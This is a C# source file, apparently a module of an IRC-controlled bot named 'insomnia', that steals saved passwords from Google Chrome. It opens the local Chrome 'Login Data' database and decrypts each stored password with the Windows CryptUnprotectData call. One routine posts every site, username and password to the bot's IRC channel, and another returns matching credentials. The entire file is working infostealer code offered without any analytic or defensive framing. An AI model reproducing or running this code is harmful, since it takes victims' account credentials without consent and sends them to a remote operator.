using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace insomnia
{
    internal class Chrome
    {
        [Flags]
        enum CryptProtectPromptFlags
        {
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
            CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct CRYPTPROTECT_PROMPTSTRUCT
        {

            public int cbSize;

            public CryptProtectPromptFlags dwPromptFlags;

            public IntPtr hwndApp;

            public string szPrompt;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct DATA_BLOB
        {

            public int cbData;

            public IntPtr pbData;
        }


        public static void GetChrome(string searchTerm)
        {
            if (String.IsNullOrEmpty(searchTerm))
                searchTerm = "**ALL**";
            string datapath = (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data");
            try
            {
                SQLiteHandler.SQLiteHandler SQLDatabase = new SQLiteHandler.SQLiteHandler(datapath);
                SQLDatabase.ReadTable("logins");
                if (File.Exists(datapath))
                {
                    string host;
                    string user;
                    string pass;
                    for (int i = 0; (i <= (SQLDatabase.GetRowCount() - 1)); i++)
                    {
                        try
                        {
                            host = SQLDatabase.GetValue(i, "origin_url");
                            user = SQLDatabase.GetValue(i, "username_value");
                            pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")));
                            if (user != "" && pass != "")
                                if (pass != "FAIL")
                                    if (host.Contains(searchTerm) || searchTerm == "**ALL**")
                                        IRC.WriteMessage("Chrome ->" + IRC.ColorCode(" " + host) + " ->" + IRC.ColorCode(" " + user) + " :" + IRC.ColorCode(" " + pass), Config._mainChannel());
                            Thread.Sleep(100);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {

            }
        }

        public static string QueryChrome(string searchTerm)
        {
            if (String.IsNullOrEmpty(searchTerm))
                searchTerm = "**ALL**";
            string datapath = (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data");
            try
            {
                SQLiteHandler.SQLiteHandler SQLDatabase = new SQLiteHandler.SQLiteHandler(datapath);
                SQLDatabase.ReadTable("logins");
                if (File.Exists(datapath))
                {
                    string host;
                    string user;
                    string pass;
                    for (int i = 0; (i <= (SQLDatabase.GetRowCount() - 1)); i++)
                    {
                        try
                        {
                            host = SQLDatabase.GetValue(i, "origin_url");
                            user = SQLDatabase.GetValue(i, "username_value");
                            pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")));
                            if (user != "" && pass != "")
                                if (pass != "FAIL")
                                    if (host.Contains(searchTerm) || searchTerm == "**ALL**")
                                        return user + ":" + pass;
                        }
                        catch
                        {
                            return "";
                        }
                    }
                }
            }
            catch
            {
                return "";
            }
            return "";
        }

        [DllImport("Crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            string szDataDescr,
            ref DATA_BLOB pOptionalEntropy,
            IntPtr pvReserved,
            ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
            int dwFlags,
            ref DATA_BLOB pDataOut);

        private static string Decrypt(byte[] Datas)
        {
            DATA_BLOB inj = new DATA_BLOB();
            DATA_BLOB Ors = new DATA_BLOB();
            GCHandle Ghandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
            inj.pbData = Ghandle.AddrOfPinnedObject();
            inj.cbData = Datas.Length;
            Ghandle.Free();
            DATA_BLOB entropy = new DATA_BLOB();
            CRYPTPROTECT_PROMPTSTRUCT crypto = new CRYPTPROTECT_PROMPTSTRUCT();
            CryptUnprotectData(ref inj, null, ref entropy, IntPtr.Zero, ref crypto, 0, ref Ors);
            byte[] Returned = new byte[Ors.cbData + 1];
            Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData);
            string TheString = Encoding.Default.GetString(Returned);
            return TheString.Substring(0, TheString.Length - 1);
        }
    }
}
